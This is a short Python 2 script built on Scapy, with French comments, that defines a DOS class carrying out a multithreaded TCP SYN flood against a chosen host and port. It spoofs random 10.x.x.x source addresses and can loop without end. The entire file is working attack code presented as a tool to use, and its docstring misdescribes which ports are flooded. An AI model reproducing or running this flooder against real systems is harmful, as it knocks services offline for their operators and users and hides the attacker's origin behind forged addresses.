#! /usr/bin/env python
# -*- coding: utf-8 -*-

from scapy.all import *
import threading
import random
import copy

class DOS():
    """
        Classe permettant d'effectuer des attaques par DOS. Pour des raisons de
        temps, seul le TCP SYN flood a été implémenté.
    """

    target = None
    port = None
    #init
    def __init__(self, target, port = 80):
        self.target = target
        self.port = int(port)

    def tcp_syn_flood(self, start=30000, end=60000, fake_ip = True, infinite = False):
        """
            Execute un tcp flood sur une cible. Par défaut l'attaque flood les ports 30 000
            à 60 000 (ou ceux spécifiés) une fois chacun. Si le paramètre infinite est à True,
            l'attaque tournera en boucle.
        """

        # Creating pool of flood threads
        pool = self.createFloodPool(start, end, 100, self.__tcp_syn_flood, fake_ip, arguments = {})

        print "Starting flooding..."
        for t in pool: t.start()      # Starting threads
        for t in pool: t.join()       # Joining threads

        while infinite:
            for t in pool: t.run()      # Restarting threads
            for t in pool: t.join()       # Joining threads

        print "Ending flooding."

    def createFloodPool(self, flood_port_start, flood_port_end, flood_port_step, funct, fake_ip, arguments = {}):
        """
            Créé un pool de threads éxécutant une fonction donnée par le paramètre 'funct'. Ces pools
            attaquent les ports 'flood_port_start' à 'flood_port_end' et chaque
            thread s'occupe de 'flood_port_step' ports.
            Si 'fake_ip' est à True, des IP factices seront insérées dans les packets envoyés.
        """

        pool = []

        for port in range(flood_port_start, flood_port_end, flood_port_step):

            # On calcul les paramètres (uniques et spécifiques) de chaque thread
            arg = copy.copy(arguments)
            arg['start'] = port
            arg['end'] = port + flood_port_step
            if fake_ip: arg['fake_ip'] ="10." + '.'.join([str(i) for i in random.sample(xrange(255), 3)])

            # On créé le thread et on l'ajoute au pool
            t = threading.Thread(target=funct, name="flood-" + str(port), kwargs=arg)
            pool.append(t)

        return pool

    def __tcp_syn_flood(self, fake_ip = None, start=40000, end=50000):
        """
            Fonction executée par chaque thread de l'attaque TCP flood. Chacun
            des threads à l'adresse IP spécifiée dans le paramètre 'fake_ip' et
            flood un intervalle de ports spécifique.
            Si 'fake_ip' est à None, alors l'adresse de la machine attaquante est utilisée
        """

        # If fake_ip specified, using the given IP to fake packet source
        if fake_ip: ip = IP(dst=self.target, src=fake_ip)
        else: ip = IP(dst=self.target)

        # Sending TCP SYN packets on port range (start, end)
        send(ip / TCP(dport=self.port, sport=(start, end), flags='S'), verbose=0)
